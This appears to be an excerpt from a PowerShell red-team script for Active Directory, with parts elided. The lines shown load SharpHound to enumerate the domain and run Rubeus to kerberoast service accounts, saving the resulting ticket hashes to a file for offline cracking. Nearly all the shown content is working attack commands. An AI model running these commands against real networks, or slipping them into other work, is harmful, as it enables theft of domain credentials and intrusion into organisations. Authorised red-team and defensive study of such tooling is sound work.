#Active Directory Red Team Enumeration Script
...
Start-Sleep -Seconds 3
. C:\temp\scripts\bin\SharpHound.ps1
...
cd Kerberoast
C:\temp\scripts\bin\Rubeus.exe kerberoast /simple /rc4opsec /outfile:KerberoastHashes.txt
cd C:\temp\scripts
